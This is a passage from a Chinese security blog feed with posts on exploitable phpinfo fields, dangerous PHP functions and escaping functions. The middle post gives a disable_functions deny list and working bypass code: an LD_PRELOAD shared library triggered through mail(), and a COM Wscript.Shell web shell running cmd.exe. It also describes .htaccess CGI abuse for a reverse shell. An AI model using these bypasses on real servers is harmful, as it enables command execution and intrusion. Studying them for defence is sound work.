Variables</strong></h3><h4 id="1-SERVER-‘PATH’"><a href="#1-SERVER-‘PATH’" class="headerlink" title="(1)_SERVER[‘PATH’]"></a><strong>(1)_SERVER[‘PATH’]</strong></h4><p>这个是 windows 下特有的，能显示出系统的所有环境变量</p><h4 id="2-SERVER-“SCRIPT-FILENAME”"><a href="#2-SERVER-“SCRIPT-FILENAME”" class="headerlink" title="(2)_SERVER[“SCRIPT_FILENAME”]"></a><strong>(2)_SERVER[“SCRIPT_FILENAME”]</strong></h4><p>这个是最常用，也是最有效的一个办法，找到phpinfo()页面可以直接找到网站的绝对路径，对于写shell和信息搜集是必不可少的。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO17.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO18.png" alt="此处输入图片的描述"></p><h4 id="3-SERVER-“SERVER-ADDR”"><a href="#3-SERVER-“SERVER-ADDR”" class="headerlink" title="(3)_SERVER[“SERVER_ADDR”]"></a><strong>(3)_SERVER[“SERVER_ADDR”]</strong></h4><p>显示该网站的真实的 ip 地址，有时候通过phpinfo()泄漏的ip可以查查旁站、c段什么的，直接无视cdn。</p><h4 id="4-FILES-“filename”"><a href="#4-FILES-“filename”" class="headerlink" title="(4)_FILES[“filename”]"></a><strong>(4)_FILES[“filename”]</strong></h4><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>这是常用的配合文件包含 get,shell 的方式，具体可见<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">这篇文章</a></p><h3 id="11-gopher"><a href="#11-gopher" class="headerlink" title="11.gopher"></a><strong>11.gopher</strong></h3><p>可以配合 SSRF 发起攻击</p><h3 id="12-fastcgi"><a href="#12-fastcgi" class="headerlink" title="12.fastcgi"></a><strong>12.fastcgi</strong></h3><p>查看是否开启fastcgi和fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题</p><h3 id="13-支持的程序"><a href="#13-支持的程序" class="headerlink" title="13.支持的程序"></a><strong>13.支持的程序</strong></h3><p>可以通过phpinfo()查看一些特殊的程序服务，比如redis、memcache、mysql、SMTP、curl等等如果服务器装了redis或者memcache可以通过ssrf来getshell了，在discuz中都出现过此类问题。如果确定装了redis或memcache的话，在没有思路的情况下，可以着重找一下ssrf</p><h2 id="0X02-PHPINFO-中要解释的信息"><a href="#0X02-PHPINFO-中要解释的信息" class="headerlink" title="0X02 PHPINFO 中要解释的信息"></a><strong>0X02 PHPINFO 中要解释的信息</strong></h2><h3 id="1-Thread-Safety"><a href="#1-Thread-Safety" class="headerlink" title="1.Thread Safety"></a><strong>1.Thread Safety</strong></h3><p>这个信息有点意思，我们一般看到的都是 disable ，但是这不代表不安全，因此这个选项严格的讲并不叫“线程安全”,应该叫 “线程安全检查”。</p><blockquote><p>None Thread Safe就是非线程安全，在执行时不进行线程（thread）安全检查。</p><p>Thread Safe就是线程安全，执行时会进行线程（thread）安全检查，以防止有新要求就启动新线程，耗尽系统资源。</p></blockquote><p>再看看这两者的选择。</p><p>为了与外部交换数据，PHP提供了一种叫SAPI的接口。</p><p>SAPI是一个中间过程，提供了一个和外部通信的接口，有点类似于socket。</p><p>SAPI使得PHP可以和其他应用进行交互数据（如Apache、Nginx等）。</p><p>PHP默认提供了很多种SAPI，常见的提供给Apache、Nginx、IIS6&#x2F;7的FastCGI，单独给IIS的ISAPI，以及Shell的CLI。</p><p>FastCGI执行方式是以单一线程来执行操作，所以不需要进行线程的安全检查，除去线程安全检查的防护反而可以提高执行效率。</p><p>而线程安全检查是为ISAPI方式的PHP准备的，也就是为IIS准备的，因为有许多php模块都不是线程安全的，所以需要使用Thread Safe的PHP。</p><p>所以，如果是以 FastCGI 执行 PHP ，都建议用Non Thread Safe的 PHP （zip安装包）。</p><h3 id="2-expose-php"><a href="#2-expose-php" class="headerlink" title="2.expose_php"></a><strong>2.expose_php</strong></h3><p>这个选项开启将会在 http 包的头部显示 php 的版本等信息，是一种信息泄露，建议关闭</p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>简单翻了一下 phpinfo 花了一点时间整理，为了以后方便吧~</p><h2 id="0X04-参考"><a href="#0X04-参考" class="headerlink" title="0X04 参考"></a><strong>0X04 参考</strong></h2><p><a href="https://www.awaimai.com/88.html">https://www.awaimai.com/88.html</a><br><a href="https://www.cnblogs.com/yangjiyue/p/7978360.html">https://www.cnblogs.com/yangjiyue/p/7978360.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 中可以利用的危险的函数</title>
    <link href="/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/"/>
    <url>/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>本文主要对 PHP 中的 disable_functions 以及一些可能会遭到利用的函数做一个罗列，并简单解释。</p><h2 id="0X01-比较全的-disable-functions"><a href="#0X01-比较全的-disable-functions" class="headerlink" title="0X01 比较全的 disable_functions"></a><strong>0X01 比较全的 disable_functions</strong></h2><pre><code class="hljs">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter,其他函数</code></pre><h3 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a><strong>1.system</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">system ( string $command [, int &amp;$return_var ] )</code></pre><p><strong>描述：</strong></p><p>同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。</p><p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。</p><p>如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</p><span id="more"></span><p><strong>参数：</strong></p><p>command<br>要执行的命令。</p><p>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p><p><strong>返回值：</strong></p><p>成功则返回命令输出的最后一行， 失败则返回 FALSE</p><h3 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a><strong>2.shell_exec</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">shell_exec ( string $cmd )</code></pre><p><strong>描述：</strong></p><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p><p><strong>返回值：</strong></p><p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</p><blockquote><p>**注意：**本函数和 &#96;&#96;(反引号等价)</p></blockquote><h3 id="3-passthru"><a href="#3-passthru" class="headerlink" title="3.passthru"></a><strong>3.passthru</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">passthru ( string $command [, int &amp;$return_var ] )</code></pre><p><strong>描述：</strong></p><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image&#x2F;gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><p><strong>参数:</strong></p><p>command<br>要执行的命令。</p><p>return_var<br>如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p><p><strong>返回值:</strong></p><p>没有返回值。</p><h3 id="4-exec"><a href="#4-exec" class="headerlink" title="4.exec"></a><strong>4.exec</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) </code></pre><p><strong>参数：</strong></p><p>command<br>要执行的命令。</p><p>output<br>如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</p><p>return_var<br>如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</p><p><strong>返回值：</strong></p><p>命令执行结果的最后一行内容</p><h3 id="5-popen"><a href="#5-popen" class="headerlink" title="5.popen()"></a><strong>5.popen()</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">resource popen ( string command, string mode )</code></pre><p><strong>描述：</strong></p><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。</p><p><strong>例子:</strong></p><pre><code class="hljs">1：$fd = popen(&quot;command&quot;, &#39;r&#39;); $ret = fgets($fd);2：$fd = popen(&quot;systeminfo &gt;d:\\1.txt&quot;, &#39;r&#39;); pclose($fd);print(fgets(fopen(&quot;d:\\1.txt&quot;,&#39;r&#39;)));3：$fd=popen(&quot;ipconfig&quot;,&#39;r&#39;);while($s=fgets($fd))&#123;print_r($s);&#125;</code></pre><p><strong>注意：</strong></p><p>只能打开单向管道，不是’r’就是’w’；并且需要使用pclose()来关闭。</p><h3 id="6-proc-open"><a href="#6-proc-open" class="headerlink" title="6.proc_open()"></a><strong>6.proc_open()</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">resource proc_open ( string cmd, array descriptorspec, array &amp;pipes [, string cwd [, array env [, array other_options]]] )</code></pre><p>**描述：**与popen类似，但是可以提供双向管道。具体的参数读者可 以自己翻阅php manual</p><p><strong>注意：</strong></p><p>A. 后面需要使用proc_close()关闭资源，并且如果是pipe类型，需要用pclose()关闭句柄。<br>B. proc_open打开的程序作为php的子进程，php退出后该子进程也会退出。</p><p><strong>例子：</strong></p><pre><code class="hljs">&lt;?php$descriptorspec=array( //这个索引数组用力指定要用proc_open创建的子进程的描述符0=&gt;array(&#39;pipe&#39;,&#39;r&#39;), //STDIN1=&gt;array(&#39;pipe&#39;,&#39;w&#39;),//STDOUT2=&gt;array(&#39;pipe&#39;,&#39;w&#39;) //STDERROR);$handle=proc_open(&#39;dir&#39;,$descriptorspec,$pipes,NULL);//$pipes中保存的是子进程创建的管道对应到 PHP 这一端的文件指针($descriptorspec指定的)if(!is_resource($handle))&#123;die(&#39;proc_open failed&#39;);&#125;//fwrite($pipes[0],&#39;ipconfig&#39;);print(&#39;stdout:&lt;br/&gt;&#39;);while($s=fgets($pipes[1]))&#123;print_r($s);&#125;print(&#39;===========&lt;br/&gt;stderr:&lt;br/&gt;&#39;);while($s=fgets($pipes[2]))&#123;print_r($s);&#125;fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($handle);?&gt;</code></pre><h3 id="7-pcntl-exec"><a href="#7-pcntl-exec" class="headerlink" title="7.pcntl_exec()"></a><strong>7.pcntl_exec()</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</code></pre><p><strong>描述：</strong></p><p>(PHP 4 &gt;&#x3D; 4.2.0, PHP 5, PHP 7)<br>pcntl_exec — 在当前进程空间执行以给定参数执行指定程序。<br>pcntl是linux下的一个扩展，可以支持php的多线程操作。</p><p><strong>参数:</strong></p><p>path: 必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径<br>标头的脚本（比如文件第一行是#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）。 更多的<br>信息请查看您系统的execve（2）手册。<br>args: 一个要传递给程序的参数的字符串数组。<br>envs: 一个要传递给程序作为环境变量的字符串数组。这个数组是 key &#x3D;&gt; value格<br>式的，key代表要传递的环境变量的名称，value代表该环境变量值。</p><p><strong>返回值:</strong></p><p>当发生错误时返回 FALSE ，没有错误时没有返回。</p><h3 id="8-mail-第五个参数-excrt-cmd"><a href="#8-mail-第五个参数-excrt-cmd" class="headerlink" title="8.mail()&#x2F;&#x2F;第五个参数 excrt_cmd"></a><strong>8.mail()&#x2F;&#x2F;第五个参数 excrt_cmd</strong></h3><p>大致就是说，第五个参数支持添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等。</p><p>如果传递了第五个参数（extra_cmd），则用spprintf将sendmail_path和extra_cmd拼接到sendmail_cmd中，随后将sendmail_cmd丢给popen执行，如果系统默认sh是bash，popen会派生bash进程，而我们刚才提到的bash 破壳漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制</p><p><strong>注意：</strong></p><p>但是如果使用了php_escape_shell_cmd函数会对特殊字符（包括&amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A and \xFF. ‘ 等）进行转义，们可以通过putenv函数来设置一个包含自定义函数的环境变量，然后通过mail()来触发</p><p><strong>详细分析：</strong><br><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a><br><a href="https://www.cnblogs.com/hookjoy/p/8988862.html">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p><h3 id="9-putenv"><a href="#9-putenv" class="headerlink" title="9.putenv()"></a><strong>9.putenv()</strong></h3><pre><code class="hljs">bool putenv ( string $setting )</code></pre><p>添加 setting 到服务器环境变量,环境变量仅存活于当前请求期间,在请求结束时环境会恢复到初始状态。 既然能自定义环境变量，那么对攻击者就很有利了，</p><p>比如：</p><p><strong>LD_PRELOAD</strong>是Linux系统的下一个有趣的环境变量，它允许你定义在程序运行前优先加载的动态链接库</p><blockquote><p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p><strong>它允许你定义在程序运行前优先加载的动态链接库</strong>，这说明我们几乎可以劫持PHP的大部分函数，还拿上面的mail函数作为例子，上文说过，php的mail函数实际上是调用了系统的sendmail命令，我们选取一个库函数geteuid</p><p>首先我们编写一个自己的动态链接程序，hack.c：</p><pre><code class="hljs">#include&lt;stdlib.h&gt;#include &lt;stdio.h&gt;        #include&lt;string.h&gt;  void payload() &#123;        system(&quot;touch/var/www/html/test&quot;);&#125;    int  geteuid() &#123;if(getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;unsetenv(&quot;LD_PRELOAD&quot;);payload();&#125;</code></pre><p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令，在&#x2F;var&#x2F;www&#x2F;html目录下创建一个名字为test的文件。这里实际应用时应该注意编译平台和目标尽量相近，以及注意路径问题，避免不必要的麻烦，这里我们仅仅作为测试，不考虑这些问题。</p><pre><code class="hljs">[root@localhostadmin]# gcc -c -fPIC hack.c -o hack[root@localhostadwin]# gcc -shared hack -o hack.so</code></pre><p><strong>我们把hack.so放到WEB目录，然后编写一个PHP文件进行测试：</strong></p><pre><code class="hljs">&lt;?phpputenv(&quot;LD_PRELOAD=/var/www/html/hack.so&quot;);mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;</code></pre><p>我们的&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下本来只有hack.so和index.php这两个文件，当我们在浏览器中访问index.php页面之后，可以看到目录下又多出了一个test文件，说明我们的系统命令执行成功。</p><h3 id="10-assert"><a href="#10-assert" class="headerlink" title="10.assert"></a><strong>10.assert</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">assert ( mixed $assertion [, string $description ] )</code></pre><p><strong>描述：</strong></p><p>如果assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p><h3 id="11-dl"><a href="#11-dl" class="headerlink" title="11.dl()"></a><strong>11.dl()</strong></h3><p>dl()函数允许在php脚本里动态加载php模块，<strong>默认是加载extension_dir目录里的扩展，<strong>该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。当然，你也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的，事实上也很少人注意到这个</strong>。dl()函数在设计时存在安全漏洞，可以用..&#x2F;这种目录遍历的方式指定加载任何一个目录里的so等扩展文件</strong>，extension_dir限制可以被随意饶过。所以我们可以上传自己的so文件，并<strong>且用dl函数加载这个so文件然后利用so文件里的函数执行其他操作，包括系统命令。</strong></p><h3 id="12-symlink"><a href="#12-symlink" class="headerlink" title="12.symlink"></a><strong>12.symlink</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">symlink ( string $target , string $link )</code></pre><p><strong>描述：</strong></p><p>symlink() 对于已有的 target 建立一个名为 link 的符号连接。</p><p><strong>参数：</strong></p><p>target<br>连接的目标。</p><p>link<br>连接的名称。</p><p><strong>返回值：</strong><br>成功时返回 TRUE， 或者在失败时返回 FALSE。</p><blockquote><p><strong>注意：</strong> 该函数仅针对 Windows：运行 PHP 于Vista、Server 2008 或更高版本才能正常使用。 之前版本的 Windows 不支持符号连接。</p></blockquote><h3 id="13-link"><a href="#13-link" class="headerlink" title="13.link"></a><strong>13.link</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">link ( string $target , string $link ) </code></pre><p><strong>描述：</strong></p><p>link() 建立一个硬连接。</p><p><strong>参数：</strong></p><p>target<br>要链接的目标。</p><p>link<br>链接的名称。</p><p><strong>返回值：</strong></p><p>成功时返回 TRUE， 或者在失败时返回 FALSE。</p><blockquote><p><strong>注意：</strong></p><p>Windows下：该功能需要以 elevated 模式运行，或者关闭 UAC。</p></blockquote><h3 id="14-ini-set-ini-alter"><a href="#14-ini-set-ini-alter" class="headerlink" title="14.ini_set()&#x2F;ini_alter()"></a><strong>14.ini_set()&#x2F;ini_alter()</strong></h3><p><strong>原型：</strong></p><pre><code class="hljs">ini_set ( string $varname , string $newvalue )</code></pre><p><strong>描述：</strong></p><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p><strong>参数：</strong></p><p>varname<br>不是所有有效的选项都能够用 ini_set() 来改变的。 这里有个有效选项的清单附录。</p><p>newvalue<br>选项新的值。</p><p><strong>返回值：</strong></p><p>成功时返回旧的值，失败时返回 FALSE。</p><blockquote><p><strong>注意：</strong></p><p>ini_alter() 是 ini_set()的别名函数</p></blockquote><h3 id="15-imap-mail"><a href="#15-imap-mail" class="headerlink" title="15.imap_mail"></a><strong>15.imap_mail</strong></h3><p>一个 bypass disable_functions 的方法 <a href="https://github.com/Bo0oM/PHP_imap_open_exploit">https://github.com/Bo0oM/PHP_imap_open_exploit</a></p><h3 id="16-其他函数"><a href="#16-其他函数" class="headerlink" title="16.其他函数"></a><strong>16.其他函数</strong></h3><p>这些函数在某些特定的 情况下还是有一定的攻击性的，选择性禁用就好了</p><h4 id="1-chroot"><a href="#1-chroot" class="headerlink" title="(1)chroot()"></a><strong>(1)chroot()</strong></h4><p>功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式PHP 时才能工作，且该函数不适用于 Windows 系统。</p><h4 id="2-scandir"><a href="#2-scandir" class="headerlink" title="(2)scandir()"></a><strong>(2)scandir()</strong></h4><p>功能描述：列出指定路径中的文件和目录。</p><h4 id="3-chgrp"><a href="#3-chgrp" class="headerlink" title="(3)chgrp()"></a><strong>(3)chgrp()</strong></h4><p>功能描述：改变文件或目录所属的用户组。</p><h4 id="4-chown"><a href="#4-chown" class="headerlink" title="(4)chown()"></a><strong>(4)chown()</strong></h4><p>功能描述：改变文件或目录的所有者。</p><h4 id="5-proc-get-status"><a href="#5-proc-get-status" class="headerlink" title="(5)proc_get_status()"></a><strong>(5)proc_get_status()</strong></h4><p>功能描述：获取使用 proc_open() 所打开进程的信息。</p><h4 id="6-error-log"><a href="#6-error-log" class="headerlink" title="(6)error_log()"></a><strong>(6)error_log()</strong></h4><p>功能描述：将错误信息发送到指定位置（文件）。<br>安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，<br>执行任意命令。</p><h4 id="7-ini-restore"><a href="#7-ini-restore" class="headerlink" title="(7)ini_restore()"></a><strong>(7)ini_restore()</strong></h4><p>功能描述：可用于恢复 PHP 环境配置参数到其初始值。</p><h4 id="8-pfsockopen"><a href="#8-pfsockopen" class="headerlink" title="(8)pfsockopen()"></a><strong>(8)pfsockopen()</strong></h4><p>功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</p><h4 id="9-syslog"><a href="#9-syslog" class="headerlink" title="(9)syslog()"></a><strong>(9)syslog()</strong></h4><p>功能描述：可调用 UNIX 系统的系统层 syslog() 函数。</p><h4 id="10-readlink"><a href="#10-readlink" class="headerlink" title="(10)readlink()"></a><strong>(10)readlink()</strong></h4><p>功能描述：返回符号连接指向的目标文件内容。</p><h4 id="11-stream-socket-server"><a href="#11-stream-socket-server" class="headerlink" title="(11)stream_socket_server()"></a><strong>(11)stream_socket_server()</strong></h4><p>功能描述：建立一个 Internet 或 UNIX 服务器连接。</p><h4 id="12-openlog"><a href="#12-openlog" class="headerlink" title="(12)openlog"></a><strong>(12)openlog</strong></h4><p>功能描述：为程序打开与系统记录器的连接。</p><blockquote><p><strong>补充：</strong></p><p>l3m0n 师傅的 disable_functions shell<br>安利一波：<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p></blockquote><h2 id="0X02-一些-bypass-disable-function"><a href="#0X02-一些-bypass-disable-function" class="headerlink" title="0X02 一些 bypass disable function"></a><strong>0X02 一些 bypass disable function</strong></h2><p>网上找了找 bypass 的方法,当然都属于比较极端的方式，利用条件苛刻，而且几乎都被 disable 了，要我说最有可能的还是 imap (也就是上面的第15点)，但还是列一下，开阔一下思路也是好的，更多信息可以看<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a> 。</p><h3 id="一、-htaccess-不只是重定向"><a href="#一、-htaccess-不只是重定向" class="headerlink" title="一、.htaccess 不只是重定向"></a><strong>一、.htaccess 不只是重定向</strong></h3><p><strong>条件：</strong></p><p>第一，必须是apache环境<br>第二，mod_cgi已经启用<br>第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none<br>第四，必须有权限写.htaccess文件</p><p>在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用，<strong>Options指令的主要作用是控制特定目录将启用哪些服务器特性我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</strong></p><p>除了Options，我们还要配合另外一个<strong>AddHandler指令</strong>来使用，如果你对AddHandler不太熟悉没关系，这么解释一下就容易理解多了：AddType我们肯定很熟悉，比如配置apache对PHP的支持的时候，经常会添加一行类似AddType application&#x2F;x-httpd-php .php这样的配置，这其实是指定了文件扩展名和内容类型之间的映射关系，而AddHandler则是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理。</p><p>有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：<strong>先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</strong></p><p><strong>详细分析：</strong><br><a href="https://www.cnblogs.com/hookjoy/p/8988862.html">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p><h3 id="二、COM-组件执行命令"><a href="#二、COM-组件执行命令" class="headerlink" title="二、COM 组件执行命令"></a><strong>二、COM 组件执行命令</strong></h3><p>漏洞出现的原因是由于在安全模式下的PHP平台虽然system();passthru()函数被禁止,但是com.allow_dcom的设置依旧是为true.以至于攻击者可以使用COM()函数创建系统组件对象来运行系统命令.如果是默认的Apache设置或者Web服务器以Loacalsystem权限或Administrators权限运行,攻击者可以使用这个漏洞来提升权限.</p><p><strong>exp :</strong></p><pre><code class="hljs">/*需要Windows Script Host 5.6支持*/&lt;?php$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);//生成com 对象$phpexec=$phpwsh-&gt;exec(&quot;cmd.exe /c $cmd&quot;);//调用 com 对象的方法执行命令$execoutput=$wshexec-&gt;stdout();$result=$execoutput-&gt;readall();echo $result;?&gt;/*Windows Script Host 5.6以下版本支持*/&lt;?php$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);$phpwsh-&gt;run(&quot;cmd.exe /c $cmd &gt; c://inetpub//wwwroot//result.txt&quot;);?&gt;将以上代码保存成*.php文件之后可以在浏览器中执行http://www.target.com/simple.php?cmd=[Command]</code></pre><h3 id="三、内核绕过"><a href="#三、内核绕过" class="headerlink" title="三、内核绕过"></a><strong>三、内核绕过</strong></h3><p>使用fopen&#x2F;fread&#x2F;fwrite函数来操纵内存文件&#x2F;proc&#x2F;self&#x2F;mem。利用这种方法，人们就可以用system()函数的地址来替换GOT中open()函数的地址，这样的话，攻击者就可以通过readfile()函数来随心所欲地执行任意os命令了。</p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>攻与防是相对的，这些函数可以说是给攻击者参考也可以说是给防御者参考吧~另外我在某网站的 disable_functions 里面还看到了一个神奇的函数—-&gt; popepassthru,在网上看到了很多有关 disable_functions 的文章里也写了这个函数,结果我在手册里面都没找到，不知道是不是我太笨了，还是谁自己创造出来的，然后所有人都复制过去了，如果真的是这样的话，只能说明有的开发人员也只是盲目的相信网上的结论然后ctrl+c,ctrl+v，完全不思考一下,也就是说要是恰好文章里有个笔误把 passthru 写成了 pasthru 就很有趣了，我猜测是这样的，还请各位师傅们指教。</p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 中的转义函数小结</title>
    <link href="/2019/02/10/PHP%20%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%87%BD%E6%95%B0%E5%B0%8F%E7%BB%93/"/>
    <url>/2019/02/10/PHP%20%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%87%BD%E6%95%B0%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>代码审计的时候经常会遇到种类繁杂的转义函数，最可怕的是他们长的都很像，还是拿出来总结一下吧。</p><h2 id="0X01-addslashes-–-PHP-4-PHP-5-PHP-7"><a href="#0X01-addslashes-–-PHP-4-PHP-5-PHP-7" class="headerlink" title="0X01 addslashes() –&gt;(PHP 4, PHP 5, PHP 7)"></a><strong>0X01 addslashes() –&gt;(PHP 4, PHP 5, PHP 7)</strong></h2><p><strong>用法：</strong></p><pre><code class="hljs">string addslashes ( string $str )</code></pre><p><strong>返回值：</strong></p><p>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。</p><p>一个使用 addslashes() 的例子是当你要往数据库中输入数据时。 例如，将名字 O’reilly 插入到数据库中，这就需要对其进行转义。 强烈建议使用 DBMS 指定的转义函数 （比如 MySQL 是 mysqli_real_escape_string()，PostgreSQL 是 pg_escape_string()），但是如果你使用的 DBMS 没有一个转义函数，并且使用 \ 来转义特殊字符，你可以使用这个函数。 <strong>仅仅是为了获取插入数据库的数据，额外的 \ 并不会插入</strong>。 当 PHP 指令 magic_quotes_sybase 被设置成 on 时，意味着插入 ‘ 时将使用 ‘ 进行转义。</p><span id="more"></span><p>PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on， 实际上所有的 GET、POST 和 COOKIE 数据都用被 addslashes() 了。 <strong>不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。</strong> 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。 </p><p><strong>代码示例：</strong></p><pre><code class="hljs">&lt;?php$str = &quot;Is your name O&#39;reilly?&quot;;// 输出： Is your name O\&#39;reilly?echo addslashes($str);?&gt;</code></pre><h2 id="0X02-stripslashes-–-PHP-4-PHP-5-PHP-7"><a href="#0X02-stripslashes-–-PHP-4-PHP-5-PHP-7" class="headerlink" title="0X02 stripslashes() 